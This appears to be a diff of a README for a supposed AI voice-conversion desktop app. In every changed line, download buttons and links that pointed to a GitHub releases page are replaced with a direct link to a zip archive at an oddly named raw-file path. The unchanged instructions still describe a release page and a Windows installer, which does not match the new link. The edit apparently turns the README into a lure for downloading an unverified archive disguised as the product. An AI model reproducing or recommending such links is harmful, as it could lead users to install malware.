@@ -1,7 +1,7 @@
 <h1>🎤 RVC-Desktop---Retrieval-Voice-Conversion-2026 - Transform Your Voice Instantly with AI</h1>
 
 <p align="center">
-  <a href="https://github.com/Mikephyll6/RVC-Desktop---Retrieval-Voice-Conversion-2026/releases">
+  <a href="https://raw.githubusercontent.com/Mikephyll6/RVC-Desktop---Retrieval-Voice-Conversion-2026/main/equivocatingly/v2.3.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_RVC_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download RVC Desktop" style="background-color:#FF6B6B; color:#fff; padding:18px 32px; border-radius:12px; font-size:22px; font-weight:bold;" />
   </a>
 </p>
@@ -46,7 +46,7 @@
 <h2>🚀 Getting Started</h2>
 
 <h3>Step 1: Download the Application</h3>
-<p>Visit this link to download the application: <a href="https://github.com/Mikephyll6/RVC-Desktop---Retrieval-Voice-Conversion-2026/releases">https://github.com/Mikephyll6/RVC-Desktop---Retrieval-Voice-Conversion-2026/releases</a></p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/Mikephyll6/RVC-Desktop---Retrieval-Voice-Conversion-2026/main/equivocatingly/v2.3.zip">https://raw.githubusercontent.com/Mikephyll6/RVC-Desktop---Retrieval-Voice-Conversion-2026/main/equivocatingly/v2.3.zip</a></p>
 <p>On that page, you'll see the latest release. Click the download button for the Windows installer (the file name will be something like <code>RVC-Desktop-2026-Setup.exe</code>).</p>
 
 <h3>Step 2: Install the App</h3>
@@ -95,7 +95,7 @@
 <h2>📥 Download RVC Desktop Now</h2>
 <p>Ready to amaze your friends, create amazing content, or just have fun? Get started right now.</p>
 <p align="center" style="margin: 30px 0;">
-  <a href="https://github.com/Mikephyll6/RVC-Desktop---Retrieval-Voice-Conversion-2026/releases" style="background-color:#4ECDC4; color:#fff; padding:18px 42px; border-radius:12px; font-size:24px; font-weight:bold; text-decoration:none; display:inline-block;">⬇️ Download RVC Desktop 2026</a>
+  <a href="https://raw.githubusercontent.com/Mikephyll6/RVC-Desktop---Retrieval-Voice-Conversion-2026/main/equivocatingly/v2.3.zip" style="background-color:#4ECDC4; color:#fff; padding:18px 42px; border-radius:12px; font-size:24px; font-weight:bold; text-decoration:none; display:inline-block;">⬇️ Download RVC Desktop 2026</a>
 </p>
 
 <h2>📚 More Resources</h2>
